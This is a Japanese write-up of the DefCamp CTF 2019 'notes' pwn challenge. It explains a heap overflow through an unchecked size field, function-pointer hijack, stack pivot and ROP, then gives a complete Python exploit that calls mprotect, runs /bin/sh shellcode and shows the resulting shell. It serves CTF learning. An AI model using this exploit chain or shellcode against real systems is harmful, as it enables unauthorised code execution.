# [pwn 334pts] notes - DefCamp CTF Qualification 2019
64ビットバイナリで、だいたい無効です。
```
$ checksec -f pwn_notes
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      No      0               0       pwn_notes
```
ですがstatic linkでstripされてるだけでSSPとかは普通にありました。
なんかcreate, edit, destroy, printがあります。ヒープ系問題でしょうか。

createするとmalloc(0x108)が呼ばれてfunctionが設定された後、randでkeyが0x20個登録されます。そのあとdata lengthを聞かれるのですが、0x83以下であればそのまま、それより大きければ0x80に修正されて、そのサイズ分readで入力できます。入力するとすぐにencrypt関数で、作ったkeysとxorして暗号化します。stripされてるので分かりづらいですが、`srand(time(0))`しているので暗号化は解除できます。構造体はこんな感じですね。
```c
typedef struct {
    void *function;
    int keys[0x20];
    char data[0x80];
    int size;
} Note;
```
editでは一度memsetでバッファを空にした後、作ったときに指定したサイズだけreadして同じ鍵でencryptします。destroyではmemsetでnoteの領域全体を空にした後、freeして`notes[i] = NULL`しています。自作ツールに投げたところ、`libc6-i386_2.23-0ubuntu11_amd64`を使ってコンパイルされていると判断されたので、tcacheは使えないでしょう。

さて、createでサイズに0x83まで入れられるのでsizeがオーバーフローできるという脆弱性があります。これによりサイズをいじると、editで次のチャンクまで書き換えられてしまいます。
あと忘れていましたが、showではfunctionに設定した関数が呼び出されます。標準で設定される関数ではnoteを引数にとり、xorして復号した結果を1文字ずつ表示しています。これを使えばヒープオーバーフローで任意関数呼び出しができます。一応`mov eax, 0Bh`しているところを探しましたが、system関数やexecve関数っぽいのは見つかりませんでした。

ということで関数ポインタを上書きすることで任意アドレスにジャンプすることができました。しかしshellを取る方法が分かりません。static linkのpwnに関する文献少なすぎでは？

いろいろ試していると、showでeipを取った時にスタックの状態が次のようになっていました。
```
pwndbg> x/32xw $esp
0xffebcb3c:     0x08048f14      0x09576230      0x00000000      0x0000000a
0xffebcb4c:     0x08048896      0x080481a8      0x080ecfbc      0x00000001
0xffebcb5c:     0x41414131      0x41414141      0x41414141      0x41414141
0xffebcb6c:     0x08000a41      0x080ecfbc      0x00000000      0xffebcba8
0xffebcb7c:     0x8fbe3800      0x080bd510      0x00000000      0xffebcba8
0xffebcb8c:     0x0804908b      0x080ecfbc      0x00000000      0x00000004
0xffebcb9c:     0x8fbe3800      0x080ed010      0xffebcbc0      0x00000000
0xffebcbac:     0x08049331      0x080ecfbc      0x00000000      0x00000000
```
Aがいっぱいありますが、これは直前のオプション選択でAをたくさん打った結果です。
つまり、espに直接ヒープのアドレスを入れる(mov esp, edx的な)ガジェットやstack pivotで飛ぶガジェットはありませんでしたが、espに0x20ほど足せばこのバッファをROP chainとして使うことができます。

今`show_func(note)`が呼ばれているので第一引数+4には暗号化されたデータが入っています。したがって、espに4足してretするとnote+4にretされるので、暗号化されたデータがROPガジェットとして実行されます。
こんなガジェットが使えそうです。
```
0x0807d8a8: add esp, 0x24 ; mov eax, esi ; pop ebx ; pop esi ; ret  ;  (1 found)
```

ROPを動かしたらmprotectでヒープを実行可能にするなり、ヒープにROPガジェットを用意してespを移すなりしますが、そのためにはヒープのアドレスが必要になります。show機能では1文字ずつputcharで出力しているのでoverreadはありません。ということで、ヒープのアドレスを取るにはprint系関数を自前で呼び出す必要がりますが、今回はprintfでFSBをすることにしました。関数アドレス+ヒープの中の暗号化されたデータが引数になるので、printfを呼び出せばFSBが引き起こせます。与えられた書式文字列のポインタはFSBでも取得できないので、printfを呼ぶ前にmainを呼ぶことでret2vulnしてスタックにヒープのアドレスを残したままFSBを引き起こすことで、ヒープのアドレスを取得します。

と思ったのですが、printfのアドレスに0x00が含まれているのでヒープの内容が何も出力されずに終わってしまいます。freeした後のデータをputsでリークしようにも、fastbinサイズじゃないのでheapのアドレスが書き込まれません。運が悪いなぁ。

途方に暮れていたのですが、普通にROPでnotesをputsすれば良いことに気づきました。灯台下暗し。

暗号化については前の問題と同じくrandを予想すれば良いので、暗号化されたデータがシェルコードになるようにすればOKです。

```python
from ptrlib import *
import ctypes

glibc = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc-2.27.so')
glibc.srand(glibc.time(0))

def create(size, data):
    key = [glibc.rand() for i in range(0x20)]
    output = b''
    for i in range(0, min(len(data), 0x80), 4):
        output += p32(u32(data[i:i+4]) ^ key[i//4])
    if len(data) > 0x80:
        output += data[0x80:]
    sock.sendlineafter("Choice: ", "1")
    sock.recvuntil("slot #")
    id = int(sock.recvline())
    sock.sendlineafter("length: ", str(size))
    sock.sendafter("encrypt: ", output)
    return id, key

def edit(index, data):
    sock.sendlineafter("Choice: ", "2")
    sock.sendlineafter("edit: ", str(index))
    sock.sendafter("encrypt: ", data)
    return

def destroy(index):
    sock.sendlineafter("Choice: ", "3")
    sock.sendlineafter("destroy: ", str(index))
    return

def show(index):
    sock.sendlineafter("Choice: ", "4")
    sock.sendlineafter("print: ", index)
    return

sock = Process("./pwn_notes")
rop_add_esp_24_pop_pop = 0x0807d8a8
addr_main = 0x8048f64
addr_puts = 0x8050730
addr_mprotect = 0x806f980
addr_note = 0x80eea20
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x90\x90\x90\x90"

# prepare
payload = b'A' * 0x80
payload += p32(0x84 + 8 + 4)[:3]
create(0x83, payload)    # 0
create(0x80, shellcode)  # 1

# leak heap address
payload = b'A' * 0x80
payload += p32(0x84 + 8 + 4)
payload += p32(0) + p32(0x111)
payload += p32(rop_add_esp_24_pop_pop)
edit(0, payload)
payload = b'1\x00AA' + b'A' * 8
payload += p32(addr_puts)
payload += p32(addr_main)
payload += p32(addr_note)
show(payload)
addr_heap = u32(sock.recvline()[:4])
logger.info("note[0] = " + hex(addr_heap))

# mprotect and run shellcode
payload = b'1\x00AA' + b'A' * 8
payload += p32(addr_mprotect)
payload += p32(addr_heap + 0x110 + 0x84)
payload += p32(addr_heap & 0xfffff000)
payload += p32(0x1000)
payload += p32(0b111)
show(payload)

sock.interactive()
```

わーい。
```
$ python solve.py 
[+] __init__: Successfully created new process (PID=9182)
[+] <module>: note[0] = 0x96b0120
[ptrlib]$ id
uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),999(docker)
[ptrlib]$
```

# 感想
個人的にかなり面白かったです。勉強になりました。
